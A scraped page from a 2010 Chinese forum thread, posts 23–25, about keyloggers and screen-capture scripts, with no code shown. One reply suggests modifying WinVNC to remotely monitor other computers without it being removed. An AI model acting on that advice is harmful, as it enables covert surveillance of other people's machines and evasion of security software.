
						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum476344" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid476344', '话题链接已经复制到剪贴板')">23楼</strong>
													<em onclick="$('postmessage_476344').className='t_bigfont'">大</em>							<em onclick="$('postmessage_476344').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_476344').className='t_smallfont'">小</em>												发表于 2010-2-11 06:36&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=11579" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_22"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_22"></div><div id="ad_thread4_22"></div>
						
						
																											<div id="postmessage_476344" class="t_msgfont">买了个keylogger正式版，从此再也不怕死机销文档。。。</div>

							
							
							
							
															<div id="post_rate_div_476344"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo476344_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=11579" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=476344&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 476344)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_22"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid479004" summary="pid479004" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=1416" target="_blank" id="userinfo479004" class="dropmenu" onmouseover="showMenu(this.id)">nicky_hk</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">烤鸭党粉丝，十二点党粉丝.</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=1416">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=1416&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_23" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum479004" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid479004', '话题链接已经复制到剪贴板')">24楼</strong>
													<em onclick="$('postmessage_479004').className='t_bigfont'">大</em>							<em onclick="$('postmessage_479004').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_479004').className='t_smallfont'">小</em>												发表于 2010-2-13 10:08&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=1416" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_23"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_23"></div><div id="ad_thread4_23"></div>
						
						
																											<div id="postmessage_479004" class="t_msgfont">建议搂住看看网上的winvnc，也是开源的，可以自己修改修改，远程监控其他电脑，而且不会被杀掉。</div>

							
							
							
							
															<div id="post_rate_div_479004"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo479004_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=1416" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=479004&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 479004)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_23"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid479005" summary="pid479005" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=1416" target="_blank" id="userinfo479005" class="dropmenu" onmouseover="showMenu(this.id)">nicky_hk</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">烤鸭党粉丝，十二点党粉丝.</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=1416">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=1416&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_24" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum479005" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=37210&page=1#pid479005', '话题链接已经复制到剪贴板')">25楼</strong>
													<em onclick="$('postmessage_479005').className='t_bigfont'">大</em>							<em onclick="$('postmessage_479005').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_479005').className='t_smallfont'">小</em>												发表于 2010-2-13 10:09&nbsp;																					<a href="viewthread.php?tid=37210&amp;page=1&amp;authorid=1416" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_24"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_24"></div><div id="ad_thread4_24"></div>
						
						
																											<div id="postmessage_479005" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>bbscn</i> 于 2010-2-10 22:43 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=476032&amp;ptid=37210" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
10行（还包含一个空行）脚本实现15秒截屏一次的功能（os x 10.5.8测试通过，*nix的xwindow应该都可以）。。。。<br />
<img src="http://imgur.com/SVU9b.png" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /><br />
其实lz这段代码没啥意义，15秒截一次屏然后保存没有优化时间长了文件夹 ... </blockquote></div>截图很漂亮，应该是vim吧，哈哈</div>

							
							
							
							
															<div id="post_rate_div_479005"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo479005_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=1416" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;repquote=479005&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 479005)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_24"></div>				</div>
			</td>
		</tr>
		</table>
		</div>
</form>





<div class="pages_btns">
	<div class="threadflow"><a href="redirect.php?fid=35&amp;tid=37210&amp;goto=nextoldset"> &#8249;&#8249; 上一主题</a> | <a href="redirect.php?fid=35&amp;tid=37210&amp;goto=nextnewset">下一主题 &#8250;&#8250;</a></div>
				<span class="postbtn" id="newspecialtmp" onmouseover="$('newspecial').id = 'newspecialtmp';this.id = 'newspecial';showMenu(this.id)"><a href="post.php?action=newthread&amp;fid=35&amp;extra="><img src="images/default/newtopic.gif" border="0" alt="发新话题" title="发新话题" /></a></span>
		<span class="replybtn"><a href="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;extra="><img src="images/default/reply.gif" border="0" alt="" /></a></span></div>

<!--精华贴打标记-->

	<script src="include/javascript/post.js" type="text/javascript"></script>
	<script type="text/javascript">
	var postminchars = parseInt('2');
	var postmaxchars = parseInt('1000000');
	var disablepostctrl = parseInt('0');
	var charset = 'gbk';
	function validate(theform) {
		if(theform.message.value == '' && theform.subject.value == '') {
			alert("请完成标题或内容栏。");
			theform.message.focus();
			return false;
		} else if(mb_strlen(theform.subject.value) > 80) {
			alert("您的标题超过 80 个字符的限制。");
			theform.subject.focus();
			return false;
		}
		if(!disablepostctrl && ((postminchars != 0 && mb_strlen(theform.message.value) < postminchars) || (postmaxchars != 0 && mb_strlen(theform.message.value) > postmaxchars))) {
			alert("您的话题长度不符合要求。\n\n当前长度: "+mb_strlen(theform.message.value)+" 字节\n系统限制: "+postminchars+" 到 "+postmaxchars+" 字节");
			return false;
		}
		if(!fetchCheckbox('parseurloff')) {
			theform.message.value = parseurl(theform.message.value, 'bbcode');
		}
		theform.replysubmit.disabled = true;
		return true;
	}
	</script>
<!--精华贴打标记-->

	<form method="post" id="postform" action="post.php?action=reply&amp;fid=35&amp;tid=37210&amp;extra=&amp;replysubmit=yes" onSubmit="return validate(this)">
		<input type="hidden" name="formhash" value="823c9fa2" />
		<div id="quickpost" class="box">
			
			<h4>快速回复主题</h4>
			<div class="postoptions">
&nbsp;
			</div>
			<div class="postform">
				<h5><label>标题
				<input type="text" name="subject" value="" tabindex="1"></label></h5>
				<p><label>内容</label>
				<textarea rows="7" cols="80" class="autosave" name="message" id="message" onKeyDown="ctlent(event);" tabindex="2"></textarea>
				</p>
				<p class="btns">
					<button type="submit" name="replysubmit" id="postsubmit" value="replysubmit" tabindex="3">发表话题</button>[完成后可按 Ctrl+Enter 发布]&nbsp;
					<a href="###" id="previewpost" onclick="$('postform').action=$('postform').action + '&previewpost=yes';$('postform').submit();">预览话题</a>&nbsp;
					<a href="###" id="restoredata" title="恢复上次自动保存的数据" onclick="loadData()">恢复数据</a>&nbsp;
					<a href="###" onclick="$('postform').reset()">清空内容</a>
				</p>
			</div>
						<script type="text/javascript">
				var textobj = $('message');
				window.onbeforeunload = function () {saveData(textobj.value)};
				if(is_ie >= 5 || is_moz >= 2) {
					lang['post_autosave_none'] = "没有可以恢复的数据！";
					lang['post_autosave_confirm'] = "此操作将覆盖当前话题内容，确定要恢复数据吗？";
				} else {
					$('restoredata').style.display = 'none';
				}
			</script>
		</div>
	</form>
	<div class="popupmenu_popup" id="forumlist_menu" style="display: none">
		<dl><dt><a href="index.php?gid=3">沙龙</a></dt><dd><ul><li><a href="forumdisplay.php?fid=2">自由新闻社</a></li><li><a href="forumdisplay.php?fid=37">雅典学院</a></li><li><a href="forumdisplay.php?fid=21">开放社会资料室</a></li><li><a href="forumdisplay.php?fid=26">国家局域网研究所</a></li><li class="current"><a href="forumdisplay.php?fid=35">罗马假日公寓</a></li><li><a href="forumdisplay.php?fid=40">Live!大讲堂</a></li></ul></dd></dl><dl><dt><a href="index.php?gid=11">站务</a></dt><dd><ul><li><a href="forumdisplay.php?fid=9">多功能小黑屋</a></li></ul></dd></dl>	</div>

<script type="text/javascript">
var maxpage = 1;
if(maxpage > 1) {
	document.onkeyup = function(e){
		e = e ? e : window.event;
		var tagname = is_ie ? e.srcElement.tagName : e.target.tagName;
		if(tagname == 'INPUT' || tagname == 'TEXTAREA') return;
		actualCode = e.keyCode ? e.keyCode : e.charCode;
					}
}
</script></div>	<div class="ad_footerbanner" id="ad_footerbanner1"></div>
	<div class="ad_footerbanner" id="ad_footerbanner2"><b> 顾问</b>：莫之许、北风、不锈钢老鼠、温克坚、艾未未、冉云飞、安替、崔卫平、闾丘露薇、章立凡 <b> 形象代言</b>：宋石男  <b>法律顾问</b>：浦志强  <b> <br>编辑</b>：张书记、上肛上腺、抑扬、musicool、王祖贤、alix001、核子力量、四夕亚日、炽鸢侯、木火 <br><b>技术</b>：库存袈裟、麦圆、散光     <br> </div>
	<div class="ad_footerbanner" id="ad_footerbanner3"></div>

<div id="footer">
	<div class="wrap">
		<div id="footlinks">

			<p>
				<a href="viewthread.php?tid=23826" target="_blank">浏览器支持说明</a>　|　<a href="member.php?action=clearcookies&amp;formhash=823c9fa2">清除 Cookies</a>
				
							</p>
		</div>
		<p id="copyright">
			CopyRight &#169; 1984bbs.com </p><p id="debuginfo">Processed in  second(s),  queries, Gzip enabled.</p>

	</div>
</div>
</body>
</html>